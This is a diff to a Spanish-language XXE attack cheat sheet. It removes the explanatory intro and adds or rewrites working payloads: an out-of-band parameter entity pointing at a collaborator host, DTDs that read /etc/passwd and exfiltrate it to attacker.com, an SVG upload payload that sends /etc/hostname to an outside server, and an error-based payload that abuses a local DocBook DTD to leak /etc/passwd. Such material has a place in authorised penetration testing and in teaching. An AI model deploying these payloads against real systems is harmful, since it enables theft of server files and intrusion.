@@ -3,14 +3,6 @@
 ### 💥 **XXE (XML External Entity) Attack Cheat Sheet** 💥
 
 ---
-
-#### **¿Qué es XXE?**  
-El ataque **XXE (XML External Entity)** aprovecha vulnerabilidades en el procesamiento de entidades XML en aplicaciones web.  
-Permite al atacante:  
-- **Leer archivos locales.**  
-- **Realizar solicitudes HTTP desde el servidor.**  
-- **Realizar ataques SSRF, DoS o RCE.**  
-
 ---
 
 ## **Tipos de Entidades en XML**
@@ -55,6 +47,8 @@ Permite al atacante:
 
 ### **Payloads:**
 ```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe;] --> utilizando parametro
+
 <!DOCTYPE foo [ <!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE"> ]>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe; ]>
 ```
@@ -71,7 +65,7 @@ Permite al atacante:
 %exfil;
 ```
 
-### **Malicious DTD 2 - Direct File Read:**
+### **Malicious DTD 2 - Direct File Read:** 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % stack "<!ENTITY exfil SYSTEM 'http://attacker.com/?file=%file;'>">
@@ -122,11 +116,12 @@ Permite al atacante:
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [
-    <!ENTITY % file SYSTEM "file:///etc/passwd">
-    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
+    <!ENTITY % file SYSTEM "file:///etc/hostname">
+    <!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://yourserver.com/?data=%file;'>">
+    %eval;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
-    <text x="0" y="16" font-size="16">&send;</text>
+    <image xlink:href="&exfil;" xmlns:xlink="http://www.w3.org/1999/xlink"/>
 </svg>
 ```
 
@@ -136,8 +131,16 @@ Permite al atacante:
 
 ### **Payload:**
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % myFile SYSTEM "file:///usr/share/xml/catalog"> %myFile; ]>
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamsa '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///noexisto/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;exfil;
+'>
+%local_dtd;
+]>
 ```
 
 ---
